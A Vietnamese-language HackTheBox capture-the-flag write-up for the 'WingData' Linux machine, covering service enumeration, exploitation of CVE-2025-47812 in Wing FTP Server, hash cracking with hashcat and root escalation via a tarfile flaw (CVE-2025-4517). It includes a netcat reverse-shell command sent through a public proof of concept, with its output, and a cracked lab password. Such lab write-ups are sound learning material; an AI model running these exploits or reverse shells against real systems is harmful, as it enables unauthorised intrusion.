---
layout: single
title: "WingData"
date: 2026-03-03 16:00:00 +0700
categories: [HackTheBox]
tags: [CTF, Web, Linux , Machine ,Hackthebox]
---
# WingData - Linux - Easy
## Tổng quan
Machine gồm 2 service chính:
- Web Server : Apache (port 80)
- SSH (port 22)

Web service là kiểu website giới thiệu công ty,gồm các page cơ bản: Home , About , Services , Contact.
Ngoài ra có cổng đăng nhập riêng ( Client Portal ) dẫn tới `ftp.wingdata.htb` sử dụng Wing FTP Server Web Client (v7.4.3).


## User flag
Scan với nmap:
```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.7.138 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 21:15 +07
Nmap scan report for 10.129.7.138
Host is up (0.035s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Sau khi enum phát hiện Wing FTP Server Web Client (v7.4.3) bị dính `CVE 2025-47812` (Unauthenticated RCE) cho phép RCE không cần login qua web FTP client.

Sử dụng [poc](https://github.com/4m3rr0r/CVE-2025-47812-poc) để rev shell về:
```bash
┌──(DELL㉿DUNGNHV-LAPTOP)
└─$ python3 .\cve-2025-47812.py -u 'http://ftp.wingdata.htb/' -c 'nc 10.10.15.208 9999 -e /bin/bash' 

[*] Testing target: http://ftp.wingdata.htb/
[+] Sending POST request to http://ftp.wingdata.htb//loginok.html with command: 'nc 10.10.15.208 9999 -e /bin/bash' and username: 'anonymous'
[+] UID extracted: 886ee744010d4aff8e811eb312827c4ff528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb//dir.html with UID: 886ee744010d4aff8e811eb312827c4ff528764d624db129b32c21fbca0cb8d6

# =================================================
┌──(DELL㉿DUNGNHV-LAPTOP)
└─$ nc.exe -nvlp 9999
listening on [any] 9999 ...
connect to [10.10.15.208] from (UNKNOWN) [10.129.7.138] 60682

python3 -c 'import pty;pty.spawn("/bin/bash")'
wingftp@wingdata:/opt/wftpserver$
```
Enum các file ở `/opt/wftpserver`,tìm được password hash của user `wacky`,thử crack với `hashcat` nhưng không được.Sau đó thử crack lại với salt `WingFTP` thì được password của user `wacky` là `!#7Blushing^*Bride5`:

```bash
# Crack bình thường ko có salt
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt

# Crack với salt WingFTP
# 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b873994f8a503ca:WingFTP
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```
SSH vào và lấy user flag:
```bash
taneora@DUNGNHV-LAPTOP:~$ ssh wacky@10.129.7.253
!#7Blushing^*Bride5
wacky@wingdata:~$ cat ~/user.txt
<user flag>
```
## Root Flag
Kiểm tra quyền sudo của user wacky:
```bash
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```
User này có thể chạy script `restore_backup_clients.py` với mọi tham số dưới quyền sudo.

Kiểm tra đoạn script phát hiện có sử dụng hàm `extractall()` có dính `CVE-2025-4517` :
```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```
Sử dụng [poc](https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData) để leo root và lấy root flag:
```bash
root@wingdata:/opt/backup_clients$ cat /root/root.txt
<root flag>
```